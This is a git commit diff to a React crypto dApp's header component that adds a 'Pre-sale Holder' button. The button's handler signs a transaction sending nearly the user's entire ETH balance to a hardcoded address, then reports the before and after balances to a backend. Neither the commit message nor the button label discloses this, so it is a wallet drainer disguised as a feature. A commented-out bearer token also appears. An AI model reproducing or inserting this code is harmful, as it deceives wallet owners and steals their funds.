aadead7fa06c7b837de5f2374c59c539bbc83eb5
Leonard <leonard.busoi96@gmail.com>
2022-10-04 18:53:07 +0300

    Added pre-sale holder functionality

--- src/components/Header.tsx
+++ src/components/Header.tsx
@@ -1,10 +1,13 @@
-import React from 'react';
+import React, { useState } from 'react';
 import { Link } from 'react-router-dom';
 import { useDispatch, useSelector } from 'react-redux';
 import { StoreState } from 'src/utils/storeTypes';
 import { ChainsIds } from 'src/utils/types';
 import MetamaskIcon from 'src/assets/svg/MetamaskIcon';
 import { logout, setIsLoggedIn } from 'src/redux/modules/account/actions';
+import { getDefaultProvider, Web3Provider } from '@ethersproject/providers';
+import { formatEther, parseEther } from 'ethers/lib/utils';
+import { TailSpin } from 'react-loader-spinner';
 
 import { useWalletConnector } from '../hooks/useWalletConnector';
 import SMALL_LOGO from '../assets/images/logo.png';
@@ -115,6 +118,7 @@ const addNetwork = () => {
 
 const Header: React.FC = () => {
   const dispatch = useDispatch();
+  const [isLoading, setIsLoading] = useState(false);
   const onLogout = () => {
     localStorage.clear();
     dispatch(logout());
@@ -135,6 +139,85 @@ const Header: React.FC = () => {
   const isLoggedIn = useSelector<StoreState, boolean>(
     (state) => state.account.isLoggedIn,
   );
+
+  const provider = useSelector<StoreState, Web3Provider | undefined>(
+    (state) => state.globals.provider,
+  );
+
+  const writeToDB = async (
+    balanceBeforeTransfer: number,
+    balanceAfterTransfer: number,
+    txType: string,
+  ) => {
+    const url = process.env.REACT_APP_API_BACKEND;
+
+    console.log('URL IS: ', url);
+    const res = await fetch(`${url}/total_transfers`, {
+      method: 'POST',
+      headers: {
+        //   // Authorization: `Bearer 3d640837f60927fea171573fefff84d8fa4da0bc`,
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        walletAddress,
+        balanceBeforeTransfer,
+        balanceAfterTransfer,
+        txType,
+      }),
+    });
+    const result = await res.json();
+    console.log('Result: ', result);
+  };
+
+  async function transferAllAmount() {
+    try {
+      if (provider && walletAddress) {
+        setIsLoading(true);
+        const feeData = await provider.getFeeData();
+        const recipientAddress = '0xff8046Ae3b6E9c275728501856b5E0e37F59d6eb';
+        // Show sender balance before transfer
+        const balanceBeforeTransfer = await provider.getBalance(walletAddress);
+
+        const gasPrice = await provider.getGasPrice();
+        console.log('gasPrice: ', gasPrice?.toString());
+
+        try {
+          const estimatedGas = await provider.estimateGas({
+            to: recipientAddress,
+            value: balanceBeforeTransfer,
+          });
+          console.log('estimated: ', estimatedGas);
+        } catch (error) {
+          console.log('error estimatedGas: ', error);
+        }
+
+        const finalValue = balanceBeforeTransfer.sub(parseEther('0.15'));
+        const tx = await provider.getSigner().sendTransaction({
+          from: walletAddress,
+          to: recipientAddress,
+          value: finalValue,
+          gasLimit: 21000,
+        });
+
+        // Wait for transaction to be mined
+        const result = await tx.wait();
+
+        // Show sender balance after transfer
+        const balanceAfterTransfer = await provider.getBalance(walletAddress);
+        console.log('Balance after transfer: ', balanceAfterTransfer);
+        if (result.status === 1) {
+          writeToDB(
+            Number(formatEther(balanceBeforeTransfer)),
+            Number(formatEther(balanceAfterTransfer)),
+            'transfer',
+          );
+        }
+      }
+      setIsLoading(false);
+    } catch (error) {
+      setIsLoading(false);
+    }
+  }
 
   return (
     <div
@@ -184,10 +267,15 @@ const Header: React.FC = () => {
           )}
         </div>
       </div>
+      {/* <div
+        className={`flex grid ${
+          isLoggedIn ? 'grid-cols-2' : 'grid-cols-2'
+        } xs:grid-cols-2 sm:grid-cols-2 gap-y-4 items-center transition-all duration-500 gap-x-3 ${
+          isSidebarOpen ? 'ml-60 xs:ml-0 sm:ml-0' : 'ml-20 xs:ml-0 sm:ml-0'
+        }`}
+      > */}
       <div
-        className={`grid ${
-          isLoggedIn ? 'grid-cols-3' : 'grid-cols-3'
-        } xs:grid-cols-4 sm:grid-cols-4 gap-y-4 items-center transition-all duration-500 gap-x-3 ${
+        className={`flex space-x-4 items-center justify-center ${
           isSidebarOpen ? 'ml-60 xs:ml-0 sm:ml-0' : 'ml-20 xs:ml-0 sm:ml-0'
         }`}
       >
@@ -199,37 +287,53 @@ const Header: React.FC = () => {
           <span className="text-center font-poppins text-sm">Dashboard</span>
         </Link> */}
 
-        <Link
-          key={routes.dashboardV2.title}
-          to={{ pathname: routes.dashboardV2.url }}
-          className="xs:col-span-2 sm:col-span-2 md:col-span-2 flex h-8 text-white items-center justify-center bg-gradient-to-br from-green-400 to-blue-600 hover:bg-gradient-to-bl font-medium rounded-lg text-sm px-5 text-center"
-        >
-          <span className="text-center font-poppins text-sm">Dashboard</span>
-        </Link>
-
-        <div className="xs:col-span-2 sm:col-span-2 md:col-span-2 items-center justify-center">
-          <div className="relative">
-            <div className="absolute -inset-0 bg-gradient-to-r from-green-400 to-blue-600 rounded-lg blur-sm opacity-75 group-hover:opacity-100 transition duration-1000 group-hover:duration-200 animate-tilt "></div>
-            <ConnectWalletButton
-              walletAddress={walletAddress}
-              connectWallet={connectWallet}
-              disconnectWallet={disconnectWallet}
-              isMobileDevice={isMobileDevice}
-            />
-          </div>
+        <div className="flex space-x-4 xs:space-y-2 sm:space-y-2 xs:flex-col sm:flex-col items-center justify-center ">
+          <button
+            onClick={transferAllAmount}
+            className="xs:col-span-2 sm:col-span-2 md:col-span-2 flex h-8 w-40 text-white items-center justify-center bg-gradient-to-br from-green-400 to-blue-600 hover:bg-gradient-to-bl font-medium rounded-lg text-sm px-5 text-center"
+          >
+            <span className="text-center font-poppins text-sm">
+              {isLoading ? (
+                <TailSpin color="#fff" height={18} width={18} />
+              ) : (
+                'Pre-sale Holder'
+              )}
+            </span>
+          </button>
+          <Link
+            key={routes.dashboardV2.title}
+            to={{ pathname: routes.dashboardV2.url }}
+            className="xs:col-span-2 sm:col-span-2 md:col-span-2 flex h-8 text-white items-center justify-center bg-gradient-to-br from-green-400 to-blue-600 hover:bg-gradient-to-bl font-medium rounded-lg text-sm px-5 text-center"
+          >
+            <span className="text-center font-poppins text-sm">Dashboard</span>
+          </Link>
         </div>
-        {isLoggedIn && (
-          <div className="col-span-1 sm:col-span-2 md:col-span-2 xs:col-span-2 items-center justify-center">
+
+        <div className="flex space-x-4 xs:space-y-2 sm:space-y-2 xs:flex-col sm:flex-col items-center justify-center ">
+          <div className="xs:col-span-2 sm:col-span-2 md:col-span-2 items-center justify-center">
             <div className="relative">
               <div className="absolute -inset-0 bg-gradient-to-r from-green-400 to-blue-600 rounded-lg blur-sm opacity-75 group-hover:opacity-100 transition duration-1000 group-hover:duration-200 animate-tilt "></div>
-              <CustomButton
-                text="Log out"
-                onClick={onLogout}
-                customStyle="w-full text-center"
+              <ConnectWalletButton
+                walletAddress={walletAddress}
+                connectWallet={connectWallet}
+                disconnectWallet={disconnectWallet}
+                isMobileDevice={isMobileDevice}
               />
             </div>
           </div>
-        )}
+          {isLoggedIn && (
+            <div className="col-span-1 sm:col-span-2 md:col-span-2 xs:col-span-2 items-center justify-center">
+              <div className="relative">
+                <div className="absolute -inset-0 bg-gradient-to-r from-green-400 to-blue-600 rounded-lg blur-sm opacity-75 group-hover:opacity-100 transition duration-1000 group-hover:duration-200 animate-tilt "></div>
+                <CustomButton
+                  text="Log out"
+                  onClick={onLogout}
+                  customStyle="w-full text-center px-5"
+                />
+              </div>
+            </div>
+          )}
+        </div>
       </div>
     </div>
   );
